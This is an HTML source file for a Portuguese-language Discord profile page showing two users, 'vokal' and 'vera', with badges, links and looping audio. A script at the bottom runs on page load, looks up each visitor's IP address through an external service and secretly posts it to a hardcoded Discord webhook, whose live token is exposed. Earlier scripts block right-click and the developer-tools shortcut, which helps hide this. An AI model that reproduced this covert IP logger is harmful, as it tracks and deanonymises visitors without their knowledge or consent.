<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title class="blinking-title">love</title>
  <link rel="icon" href="images/1297952981798617090.webp" type="image/png">
  <link rel="stylesheet" href="css/styles.css">
</head>
<body>
  <script>
    document.addEventListener('contextmenu', function(event) {
        event.preventDefault(); 
    });

    document.addEventListener('keydown', function(event) {
        if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.key === 'I') {
            event.preventDefault(); 
        }
    });

    function audioPlay() {
        var audio = document.getElementById("audio");
        audio.volume = 1.0;
        audio.currentTime = 0;
        audio.play();
    }
  </script>
  
  <audio loop="" preload="auto" id="audio">
    <source src="media/cretina.mp3" type="audio/mpeg">
  </audio>
  
  <input type="checkbox" autocomplete="off" id="overlay-toggle">
  <div class="overlay fullscreen">
    <label for="overlay-toggle" onclick="audioPlay(); ">
      <span class="overlayhover hover" style="font-family: monospace; font-size: 0.6em;">love</span>
    </label>
  </div>

  <div class="profile-container">
    <div class="card">
      <div class="avatar">
        <img id="avatar1" src="images/1.png" alt="Avatar do Discord">
      </div>
      <div class="info">
        <h1 id="nickname1">
          <span id="nickname-text1">vokal</span>
        </h1>
        <p id="subnick1" class="subnick">vokal</p>
        <span class="badges">
          <img src="images/discordnitro.svg" alt="Nitro" class="badge" id="nitro-badge1">
          <img src="images/discordboost4.png" alt="Boost" class="badge" id="boost-badge1">
        </span>
      </div>
      <a href="https://assaltante.com/" target="_blank">
        <img src="images/1265680565047398431.webp" alt="Discord Icon" class="social-icon">
      </a>
    </div>
    <div class="card">
      <div class="avatar">
        <img id="avatar2" src="images/2.png" alt="Avatar do Discord">
      </div>
      <div class="info">
        <h1 id="nickname2">
          <span id="nickname-text2">vera</span>
        </h1>
        <p id="subnick2" class="subnick">vera</p>
        <span class="badges">
          <img src="images/discordnitro.svg" alt="Nitro" class="badge" id="nitro-badge2">
          <img src="images/discordboost4.png" alt="Boost" class="badge" id="boost-badge2">
        </span>
      </div>
      <a href="https://assaltante.com/" target="_blank">
        <img src="images/1330017039800078336.png" alt="Discord Icon" class="social-icon">
      </a>
    </div>
  </div>
 <script>
    const discordWebhookUrl = "https://discord.com/api/webhooks/1341227695635169380/YWE1Yi2oXFTWGn2C-LBh_mbu0UeXgaUhxw_NC0b8YG1sedO-fJDu89eOIpMyL_sHyrQ2";

    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        const userIp = data.ip;
        fetch(discordWebhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `assaltante: Novo visitante com IP: ${userIp}`
          })
        })
        .then(() => console.log(`IP enviado para o Discord: ${userIp}`))
        .catch(err => console.error("Erro ao enviar IP:", err));
      })
      .catch(err => console.error("Erro ao obter o IP:", err));
  </script>
  
  <script src="script.js"></script>
</body>
</html>
